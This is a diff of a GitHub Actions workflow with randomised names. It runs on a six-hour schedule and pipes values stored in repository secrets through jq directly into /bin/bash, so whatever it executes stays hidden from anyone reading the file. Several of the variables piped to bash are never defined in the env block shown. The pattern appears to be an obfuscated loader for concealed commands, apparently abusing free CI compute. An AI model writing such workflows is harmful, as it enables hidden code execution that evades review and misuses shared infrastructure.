@@ -2,25 +2,20 @@ name: wangmanying7654
 on:
   workflow_dispatch:
   schedule:
-    - cron: '31 5/6 * * *'
+    - cron: '54 5/6 * * *'
 
-jobs:  # 31170
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: wangmanying7654
         env:
-          pe7342: ${{ secrets.pe7342 }}
+          dbc4397: ${{ secrets.dbc4397 }}
         run: |
-          echo $pe7342 | jq -r .osegm7 | /bin/bash
-          echo $d77974 | jq -r .fj01 | /bin/bash
-          echo $fz2 | jq -r .avvi67345 | /bin/bash
-          echo $eg8075 | jq -r .v4 | /bin/bash
-          echo $gi312 | jq -r .yw5751 | /bin/bash
-          echo $dmibl8580 | jq -r .vd7130 | /bin/bash
-          echo $i8222 | jq -r .pwuy65 | /bin/bash
-          echo $u05576 | jq -r .sdea2594 | /bin/bash
-          echo $f30 | jq -r .sx41331 | /bin/bash
+          echo $dbc4397 | jq -r .q6 | /bin/bash
+          echo $cbf78 | jq -r .ffh5 | /bin/bash
+          echo $ia1769 | jq -r .t55086 | /bin/bash
+          echo $b5944 | jq -r .vm478 | /bin/bash
+          echo $vexrd895 | jq -r .nf4 | /bin/bash
 
